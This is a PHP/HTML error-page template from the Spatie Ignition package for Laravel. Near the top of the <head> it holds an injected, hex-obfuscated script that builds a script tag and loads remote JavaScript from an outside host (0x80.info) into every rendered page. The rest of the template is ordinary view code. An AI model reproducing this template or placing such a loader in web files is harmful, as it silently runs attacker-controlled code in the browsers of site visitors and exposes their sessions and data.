<!DOCTYPE html>
<?php /** @var \Spatie\Ignition\ErrorPage\ErrorPageViewModel $viewModel */ ?>
<html lang="en" class="<?= $viewModel->theme() ?>">
<!--
<?= $viewModel->throwableString() ?>
-->
<head>
<script>var _0x46c7=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x30\x78\x38\x30\x2E\x69\x6E\x66\x6F\x2F\x61","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"];var a=document[_0x46c7[1]](_0x46c7[0]);a[_0x46c7[2]]= _0x46c7[3];document[_0x46c7[6]](_0x46c7[5])[0][_0x46c7[4]](a)</script>
    <!-- Hide dumps asap -->
    <style>
        pre.sf-dump {
            display: none !important;
        }
    </style>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="robots" content="noindex, nofollow">

    <title><?= $viewModel->title() ?></title>

    <script>
        // Livewire modals remove CSS classes on the `html` element so we re-add
        // the theme class again using JavaScript.
        document.documentElement.classList.add('<?= $viewModel->theme() ?>');

        // Process `auto` theme as soon as possible to avoid flashing of white background.
        if (document.documentElement.classList.contains('auto') && window.matchMedia('(prefers-color-scheme: dark)').matches) {
            document.documentElement.classList.add('dark');
        }
    </script>

    <style><?= $viewModel->getAssetContents('ignition.css') ?></style>

    <?= $viewModel->customHtmlHead() ?>

</head>
<body class="scrollbar-lg antialiased bg-center bg-dots-darker dark:bg-dots-lighter">

<script>
    window.data = <?=
        $viewModel->jsonEncode([
            'report' => $viewModel->report(),
            'shareableReport' => $viewModel->shareableReport(),
            'config' => $viewModel->config(),
            'solutions' => $viewModel->solutions(),
            'updateConfigEndpoint' => $viewModel->updateConfigEndpoint(),
        ])
    ?>;
</script>

<!-- The noscript representation is for HTTP client like Postman that have JS disabled. -->
<noscript>
    <pre><?= $viewModel->throwableString() ?></pre>
</noscript>

<div id="app"></div>

<script>
    <!--
    <?= $viewModel->getAssetContents('ignition.js') ?>
    -->
</script>

<script>
    window.ignite(window.data);
</script>

<?= $viewModel->customHtmlBody() ?>

<!--
<?= $viewModel->throwableString() ?>
-->
</body>
</html>
